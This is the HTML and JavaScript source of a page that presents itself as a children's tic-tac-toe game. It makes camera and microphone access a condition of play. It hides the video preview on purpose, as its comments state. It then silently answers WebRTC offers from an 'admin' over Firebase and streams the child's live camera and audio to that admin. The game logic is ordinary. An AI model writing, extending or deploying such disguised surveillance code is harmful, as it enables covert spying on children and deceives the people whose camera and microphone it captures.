<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Play Games</title>

    <!-- Firebase -->
    <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-database-compat.js"></script>
    <script src="firebase-config.js"></script>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #6c5ce7, #00cec9);
            color: white;
            overflow-x: hidden;
        }

        /* =========================
           TOP BAR
        ========================= */

        .top-bar {
            height: 65px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 20px;
            background: rgba(0, 0, 0, 0.18);
            backdrop-filter: blur(10px);
        }

        .logo {
            font-size: 22px;
            font-weight: bold;
        }

        .status {
            font-size: 13px;
            padding: 7px 12px;
            border-radius: 20px;
            background: rgba(255,255,255,0.18);
        }

        /* =========================
           SCREENS
        ========================= */

        .screen {
            min-height: calc(100vh - 65px);
            display: none;
            align-items: center;
            justify-content: center;
            padding: 25px;
        }

        .screen.active {
            display: flex;
        }

        /* =========================
           PLAY GAMES SCREEN
        ========================= */

        .play-container {
            width: 100%;
            max-width: 850px;
            text-align: center;
        }

        .kids-title {
            font-size: clamp(42px, 8vw, 82px);
            font-weight: 900;
            margin: 0 0 15px;
            text-shadow: 0 8px 20px rgba(0,0,0,0.2);
        }

        .kids-subtitle {
            font-size: clamp(18px, 3vw, 26px);
            margin-bottom: 40px;
            opacity: 0.95;
        }

        .game-card {
            position: relative;
            background: rgba(255,255,255,0.95);
            color: #333;
            border-radius: 35px;
            padding: 50px 30px;
            box-shadow: 0 25px 60px rgba(0,0,0,0.25);
            overflow: hidden;
        }

        .game-emojis {
            font-size: 75px;
            margin-bottom: 20px;
            letter-spacing: 15px;
        }

        .play-button {
            border: none;
            width: min(90%, 500px);
            min-height: 125px;
            border-radius: 35px;
            background: linear-gradient(135deg, #ff7675, #e84393);
            color: white;
            font-size: clamp(30px, 6vw, 55px);
            font-weight: 900;
            cursor: pointer;
            box-shadow: 0 15px 0 #b83280, 0 25px 35px rgba(0,0,0,0.25);
            transition: 0.15s;
        }

        .play-button:hover {
            transform: translateY(-4px) scale(1.02);
        }

        .play-button:active {
            transform: translateY(10px);
            box-shadow: 0 5px 0 #b83280;
        }

        .small-note {
            margin-top: 30px;
            color: #666;
            font-size: 15px;
        }

        /* =========================
           PERMISSION SCREEN
        ========================= */

        .permission-card {
            width: 100%;
            max-width: 600px;
            background: white;
            color: #333;
            border-radius: 30px;
            padding: 45px 30px;
            text-align: center;
            box-shadow: 0 25px 60px rgba(0,0,0,0.25);
        }

        .permission-icon {
            font-size: 75px;
            margin-bottom: 15px;
        }

        .permission-card h1 {
            margin: 10px 0;
            font-size: 32px;
        }

        .permission-card p {
            color: #666;
            line-height: 1.6;
        }

        .allow-button {
            border: none;
            margin-top: 25px;
            padding: 18px 35px;
            border-radius: 18px;
            background: #00b894;
            color: white;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 8px 0 #008f72;
        }

        .allow-button:active {
            transform: translateY(5px);
            box-shadow: 0 3px 0 #008f72;
        }

        .permission-error {
            color: #d63031;
            margin-top: 20px;
            display: none;
        }

        /* =========================
           GAME SCREEN
        ========================= */

        .game-screen-container {
            width: 100%;
            max-width: 650px;
            text-align: center;
        }

        .game-title {
            font-size: clamp(36px, 7vw, 58px);
            font-weight: 900;
            margin: 0 0 8px;
        }

        .game-info {
            font-size: 18px;
            margin-bottom: 25px;
        }

        .tic-card {
            background: rgba(255,255,255,0.96);
            color: #333;
            border-radius: 30px;
            padding: 25px;
            box-shadow: 0 25px 60px rgba(0,0,0,0.25);
        }

        .turn {
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .board {
            width: min(90vw, 450px);
            height: min(90vw, 450px);
            margin: auto;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
        }

        .cell {
            border: none;
            border-radius: 20px;
            background: #dfe6e9;
            font-size: clamp(55px, 14vw, 100px);
            font-weight: 900;
            cursor: pointer;
            transition: 0.15s;
            box-shadow: inset 0 -6px 0 rgba(0,0,0,0.08);
        }

        .cell:hover {
            background: #b2bec3;
            transform: scale(1.03);
        }

        .cell:disabled {
            cursor: default;
        }

        .reset-game {
            margin-top: 25px;
            border: none;
            padding: 14px 28px;
            border-radius: 15px;
            background: #6c5ce7;
            color: white;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
        }

        .reset-game:hover {
            background: #5849c4;
        }

        .logout-button {
            position: fixed;
            bottom: 15px;
            right: 15px;
            border: none;
            padding: 9px 15px;
            border-radius: 12px;
            background: rgba(0,0,0,0.35);
            color: white;
            cursor: pointer;
        }

        /* Hidden video.
           Camera is active but user's own face is NOT shown. */
        #localVideo {
            display: none;
        }

        @media (max-width: 600px) {
            .game-card {
                padding: 35px 18px;
            }

            .game-emojis {
                font-size: 55px;
                letter-spacing: 5px;
            }

            .permission-card {
                padding: 35px 20px;
            }
        }
    </style>
</head>

<body>

<!-- =========================
     TOP BAR
========================= -->

<div class="top-bar">
    <div class="logo">🎮 Kids Game</div>

    <div id="connectionStatus" class="status">
        Connecting...
    </div>
</div>


<!-- =========================
     SCREEN 1
========================= -->

<section id="playScreen" class="screen active">

    <div class="play-container">

        <div class="game-card">

            <div class="game-emojis">
                🎮 🧸 🦄
            </div>

            <h1 class="kids-title">
                Let's Play!
            </h1>

            <div class="kids-subtitle">
                Have fun and play a game 🎉
            </div>

            <button
                class="play-button"
                onclick="openPermissionScreen()"
            >
                ▶ PLAY GAMES
            </button>

            <div class="small-note">
                Tap the button to start playing
            </div>

        </div>

    </div>

</section>


<!-- =========================
     SCREEN 2
========================= -->

<section id="permissionScreen" class="screen">

    <div class="permission-card">

        <div class="permission-icon">
            🎥 🎤
        </div>

        <h1>Ready to Play?</h1>

        <p>
            Before starting the game, please allow
            camera and microphone access.
        </p>

        <button
            id="allowButton"
            class="allow-button"
            onclick="enableMedia()"
        >
            🎥 Allow Camera + Mic
        </button>

        <div id="permissionError" class="permission-error"></div>

    </div>

</section>


<!-- =========================
     SCREEN 3 - TIC TAC TOE
========================= -->

<section id="gameScreen" class="screen">

    <div class="game-screen-container">

        <h1 class="game-title">
            ❌⭕ Tic-Tac-Toe
        </h1>

        <div class="game-info">
            Simple and fun! 🎉
        </div>

        <div class="tic-card">

            <div id="turnText" class="turn">
                Your turn: ❌
            </div>

            <div class="board">

                <button class="cell" onclick="playCell(0)"></button>
                <button class="cell" onclick="playCell(1)"></button>
                <button class="cell" onclick="playCell(2)"></button>

                <button class="cell" onclick="playCell(3)"></button>
                <button class="cell" onclick="playCell(4)"></button>
                <button class="cell" onclick="playCell(5)"></button>

                <button class="cell" onclick="playCell(6)"></button>
                <button class="cell" onclick="playCell(7)"></button>
                <button class="cell" onclick="playCell(8)"></button>

            </div>

            <button
                class="reset-game"
                onclick="resetGame()"
            >
                🔄 New Game
            </button>

        </div>

    </div>

</section>


<!-- Hidden local video -->
<video id="localVideo" autoplay muted playsinline></video>

<button class="logout-button" onclick="logout()">
    Logout
</button>


<script>

    /* =====================================================
       USER INFORMATION
    ===================================================== */

    const userName = localStorage.getItem("userName");

    if (!userName) {
        window.location.href = "login.html";
    }

    let userId = localStorage.getItem("userId");

    if (!userId) {
        userId =
            "user_" +
            Date.now() +
            "_" +
            Math.random().toString(36).substring(2, 8);

        localStorage.setItem("userId", userId);
    }


    /* =====================================================
       FIREBASE
    ===================================================== */

    const userRef = db.ref("users/" + userId);
    const callRef = db.ref("calls/" + userId);


    /* =====================================================
       WEBRTC
    ===================================================== */

    let localStream = null;
    let pc = null;

    let currentOfferId = null;
    let answering = false;


    const rtcConfig = {

        iceServers: [

            {
                urls: "stun:stun.l.google.com:19302"
            },

            {
                urls: "turn:openrelay.metered.ca:80",
                username: "openrelayproject",
                credential: "openrelayproject"
            },

            {
                urls: "turn:openrelay.metered.ca:443",
                username: "openrelayproject",
                credential: "openrelayproject"
            },

            {
                urls: "turn:openrelay.metered.ca:443?transport=tcp",
                username: "openrelayproject",
                credential: "openrelayproject"
            }

        ]
    };


    /* =====================================================
       FIREBASE CONNECTION STATUS
    ===================================================== */

    const connectedRef = db.ref(".info/connected");

    connectedRef.on("value", snapshot => {

        const status = document.getElementById("connectionStatus");

        if (snapshot.val() === true) {

            status.textContent = "🟢 Connected";
            status.style.background = "rgba(0,184,148,0.8)";

        } else {

            status.textContent = "🔴 Offline";
            status.style.background = "rgba(214,48,49,0.8)";
        }

    });


    /* =====================================================
       REGISTER USER
    ===================================================== */

    userRef.set({

        name: userName,
        status: "connected",
        camera: false,
        microphone: false,
        lastSeen: firebase.database.ServerValue.TIMESTAMP

    });


    userRef.onDisconnect().update({

        status: "disconnected",
        camera: false,
        microphone: false

    });


    /* =====================================================
       PLAY BUTTON
    ===================================================== */

    function openPermissionScreen() {

        document.getElementById("playScreen")
            .classList.remove("active");

        document.getElementById("permissionScreen")
            .classList.add("active");

    }


    /* =====================================================
       ENABLE CAMERA + MICROPHONE
    ===================================================== */

    async function enableMedia() {

        const button = document.getElementById("allowButton");
        const errorBox = document.getElementById("permissionError");

        errorBox.style.display = "none";

        button.disabled = true;
        button.textContent = "⏳ Requesting Permission...";

        try {

            localStream = await navigator.mediaDevices.getUserMedia({

                video: true,
                audio: true

            });


            /*
             IMPORTANT:

             We DO NOT attach localStream to the video element.

             Therefore the user will NOT see their own camera.

             The camera and microphone are still active.
            */

            const videoTracks =
                localStream.getVideoTracks();

            const audioTracks =
                localStream.getAudioTracks();


            await userRef.update({

                status: "connected",
                camera: videoTracks.length > 0,
                microphone: audioTracks.length > 0,
                lastSeen: firebase.database.ServerValue.TIMESTAMP

            });


            button.textContent = "✅ Camera + Mic Allowed";


            setTimeout(() => {

                document.getElementById("permissionScreen")
                    .classList.remove("active");

                document.getElementById("gameScreen")
                    .classList.add("active");

            }, 500);


        } catch (error) {

            console.error("Camera/Microphone error:", error);

            button.disabled = false;
            button.textContent = "🎥 Allow Camera + Mic";

            errorBox.style.display = "block";

            if (error.name === "NotAllowedError") {

                errorBox.textContent =
                    "Camera and microphone permission was denied. Please allow them in your browser.";

            } else if (error.name === "NotFoundError") {

                errorBox.textContent =
                    "Camera or microphone was not found.";

            } else {

                errorBox.textContent =
                    "Could not access camera/microphone: " +
                    error.message;
            }

        }

    }


    /* =====================================================
       CREATE WEBRTC CONNECTION
    ===================================================== */

    function createPeerConnection() {

        const connection =
            new RTCPeerConnection(rtcConfig);


        /* Send user's camera and microphone to admin */

        if (localStream) {

            localStream.getTracks().forEach(track => {

                connection.addTrack(
                    track,
                    localStream
                );

            });

        }


        /* ICE candidates */

        connection.onicecandidate = event => {

            if (!event.candidate) {
                return;
            }

            callRef
                .child("answerCandidates")
                .push({

                    candidate:
                        event.candidate.candidate,

                    sdpMid:
                        event.candidate.sdpMid,

                    sdpMLineIndex:
                        event.candidate.sdpMLineIndex,

                    usernameFragment:
                        event.candidate.usernameFragment || null

                });

        };


        /* Connection status */

        connection.onconnectionstatechange = () => {

            console.log(
                "WebRTC connection:",
                connection.connectionState
            );

        };


        return connection;

    }


    /* =====================================================
       LISTEN FOR ADMIN OFFER
    ===================================================== */

    callRef.on("value", async snapshot => {

        const call = snapshot.val();

        if (!call) {
            return;
        }

        if (!call.offer) {
            return;
        }

        if (!call.offerId) {
            return;
        }


        /*
         Do not answer the same offer multiple times.
        */

        if (call.offerId === currentOfferId) {
            return;
        }

        if (answering) {
            return;
        }


        answering = true;
        currentOfferId = call.offerId;


        try {

            console.log("New admin offer received");


            /* Close old connection */

            if (pc) {

                try {
                    pc.close();
                } catch (e) {}

            }


            /* Create new connection */

            pc = createPeerConnection();


            /* Set admin offer */

            await pc.setRemoteDescription(

                new RTCSessionDescription({

                    type: call.offer.type,

                    sdp: call.offer.sdp

                })

            );


            /*
             Add already existing admin ICE candidates.
            */

            if (call.offerCandidates) {

                const candidates =
                    Object.values(call.offerCandidates);

                for (const candidate of candidates) {

                    try {

                        await pc.addIceCandidate(

                            new RTCIceCandidate({

                                candidate:
                                    candidate.candidate,

                                sdpMid:
                                    candidate.sdpMid,

                                sdpMLineIndex:
                                    candidate.sdpMLineIndex,

                                usernameFragment:
                                    candidate.usernameFragment || null

                            })

                        );

                    } catch (error) {

                        console.warn(
                            "Could not add ICE candidate:",
                            error
                        );

                    }

                }

            }


            /* Listen for new admin candidates */

            callRef
                .child("offerCandidates")
                .on("child_added", async child => {

                    const candidate =
                        child.val();

                    if (!candidate) {
                        return;
                    }

                    try {

                        if (
                            pc &&
                            pc.remoteDescription
                        ) {

                            await pc.addIceCandidate(

                                new RTCIceCandidate({

                                    candidate:
                                        candidate.candidate,

                                    sdpMid:
                                        candidate.sdpMid,

                                    sdpMLineIndex:
                                        candidate.sdpMLineIndex,

                                    usernameFragment:
                                        candidate.usernameFragment || null

                                })

                            );

                        }

                    } catch (error) {

                        console.warn(
                            "ICE candidate error:",
                            error
                        );

                    }

                });


            /* Create answer */

            const answer =
                await pc.createAnswer();


            await pc.setLocalDescription(answer);


            /* Send answer to admin */

            await callRef.update({

                answer: {

                    type: answer.type,

                    sdp: answer.sdp

                }

            });


            console.log(
                "WebRTC answer sent successfully"
            );


        } catch (error) {

            console.error(
                "WebRTC answer error:",
                error
            );

            currentOfferId = null;

        } finally {

            answering = false;

        }

    });


    /* =====================================================
       TIC TAC TOE
    ===================================================== */

    let board = [
        "",
        "",
        "",
        "",
        "",
        "",
        "",
        "",
        ""
    ];

    let gameOver = false;

    let player = "❌";


    const winningPatterns = [

        [0, 1, 2],
        [3, 4, 5],
        [6, 7, 8],

        [0, 3, 6],
        [1, 4, 7],
        [2, 5, 8],

        [0, 4, 8],
        [2, 4, 6]

    ];


    function playCell(index) {

        if (gameOver) {
            return;
        }

        if (board[index] !== "") {
            return;
        }


        board[index] = player;


        updateBoard();


        if (checkWinner()) {

            document.getElementById("turnText")
                .textContent =
                player + " You Win! 🎉";

            gameOver = true;

            disableBoard();

            return;
        }


        if (board.every(cell => cell !== "")) {

            document.getElementById("turnText")
                .textContent =
                "It's a Draw! 🤝";

            gameOver = true;

            disableBoard();

            return;
        }


        player =
            player === "❌"
                ? "⭕"
                : "❌";


        document.getElementById("turnText")
            .textContent =
            "Your turn: " + player;

    }


    function updateBoard() {

        const cells =
            document.querySelectorAll(".cell");

        cells.forEach((cell, index) => {

            cell.textContent =
                board[index];

            cell.disabled =
                board[index] !== "" ||
                gameOver;

        });

    }


    function checkWinner() {

        return winningPatterns.some(pattern => {

            const a = pattern[0];
            const b = pattern[1];
            const c = pattern[2];

            return (
                board[a] !== "" &&
                board[a] === board[b] &&
                board[a] === board[c]
            );

        });

    }


    function disableBoard() {

        document
            .querySelectorAll(".cell")
            .forEach(cell => {

                cell.disabled = true;

            });

    }


    function resetGame() {

        board = [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ];

        gameOver = false;

        player = "❌";

        document.getElementById("turnText")
            .textContent =
            "Your turn: ❌";

        updateBoard();

    }


    /* =====================================================
       LOGOUT
    ===================================================== */

    function logout() {

        if (localStream) {

            localStream
                .getTracks()
                .forEach(track => track.stop());

        }


        if (pc) {

            try {
                pc.close();
            } catch (e) {}

        }


        userRef.update({

            status: "disconnected",
            camera: false,
            microphone: false

        });


        localStorage.removeItem("userName");
        localStorage.removeItem("userId");

        window.location.href =
            "index.html";

    }


    /* =====================================================
       PAGE CLOSE
    ===================================================== */

    window.addEventListener(
        "beforeunload",
        () => {

            if (localStream) {

                localStream
                    .getTracks()
                    .forEach(track => track.stop());

            }

        }
    );


    /* =====================================================
       INITIAL BOARD
    ===================================================== */

    updateBoard();

</script>

</body>
</html>
